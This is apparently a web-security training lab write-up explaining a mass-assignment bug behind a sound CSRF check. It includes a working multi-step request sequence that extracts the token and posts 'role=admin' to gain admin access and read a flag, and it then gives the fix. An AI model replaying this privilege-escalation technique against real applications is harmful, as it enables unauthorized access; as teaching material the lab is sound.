# Lab 41 — Settings

## The CSRF protection is not the bug

```python
token = secrets.token_hex(16)
CSRF[sid] = token            # fresh on every render
…
if not secrets.compare_digest(form_data.get("csrf", ""), CSRF.get(sid, "\0")):
    return 403
CSRF.pop(sid, None)          # single use
```

Random, session-bound, single-use, compared in constant time. There is nothing
wrong with it, and it stops Lab 22's attack completely.

What it does not do is stop *you*. You are not a cross-site attacker; you are a
logged-in user with a browser. A CSRF token protects against requests the user
did not intend — it says nothing about what the request may contain.

## The bug

```python
for key, value in form_data.items():
    if key != "csrf":
        SESSIONS[sid][key] = value
```

Mass assignment (Lab 09), reached through a form. The token check is perfect and
the *field list* is not checked at all.

This pairing is worth internalising: **a strong control on one axis frequently
distracts from the absence of a control on another.** Rate limiting is not
authorization; CSRF tokens are not input validation; TLS is not authentication.

## Why a single `replay` cannot do it

The token is minted by `GET /account/settings` and dies when used. So the test
is: log in, render the form, take the token, post with the token — four requests
where each depends on the one before.

Hand-carrying a value between two shell commands is where mistakes live: you
copy a stale token, the session cookie is from a different jar, and the 403 you
get looks exactly like the finding you were hoping for.

## `websec sequence`

```json
{
  "steps": [
    { "name": "log in", "resend": 0, "create": true,
      "set": ["method=POST", "path=/api/login",
              "header.Content-Type=application/json",
              "json.user=${user}", "json.password=${password}"] },

    { "name": "render the form and take its token",
      "resend": 0, "create": true,
      "set": ["method=GET", "path=/account/settings"],
      "extract": { "csrf": "regex:name=\"csrf\" value=\"([^\"]+)\"" } },

    { "name": "save, with one field the form never had",
      "resend": 0, "create": true,
      "set": ["method=POST", "path=/account/settings",
              "header.Content-Type=application/x-www-form-urlencoded",
              "form.display_name=Guest", "form.csrf=${csrf}",
              "form.role=admin"] },

    { "name": "collect", "resend": 0, "create": true,
      "set": ["method=GET", "path=/admin/flag"],
      "extract": { "flag": "regex:(FLAG\\{[^}]+\\})" } }
  ]
}
```

```bash
h5i websec sequence flow.json --session lab41 --var user=guest --var password=guest
```

The parts:

* **`resend: N`** — which stored message each step is built from. Everything
  here starts from `req_0`, the homepage GET, plus `create: true`.
* **`extract`** — what to bind out of the answer, by name. Four extractors:
  `regex:` (first capture group), `json:` (a dotted path), `header:`, and
  `status`.
* **`${name}`** — substituted into a later step's `set`. An **unbound name is an
  error that stops the sequence**, rather than an empty string: a request that
  goes out with `csrf=` gets a 403 that looks exactly like the finding somebody
  is hunting for, and that is the worst way for a test to fail.
* **`--var`** — bind a name before the first step, so one file serves many
  targets and credentials stay off the command line in your notes.
* **`--keep-going`** — run every step even after one fails, to read a whole
  file's failures at once. Off by default, because a step acting on a token the
  step before it failed to produce is acting on a state the file never
  described.
* The cookie jar is the session's, so the `Set-Cookie` from step one is on step
  two automatically. You never handle it.

## When to reach for a sequence

* any flow with a CSRF token, nonce, or `state` parameter
* login → get token → use token
* OAuth: authorize → callback → exchange (Lab 24)
* multi-step checkout, onboarding, or MFA (Lab 39)
* anything you have typed twice and got wrong once

A sequence file is also the artefact you hand over. It is a reproduction someone
else can run against a fixed build, which is worth more in a report than a
paragraph describing four requests.

## The fix

Allowlist the fields (Lab 09) — `{"display_name"}` — and keep `role` on an
object that no request body can name. The CSRF token stays; it was never the
problem.

## h5i technique

`websec sequence FILE --var NAME=VALUE [--keep-going]`, with
`extract` / `${…}` bindings.
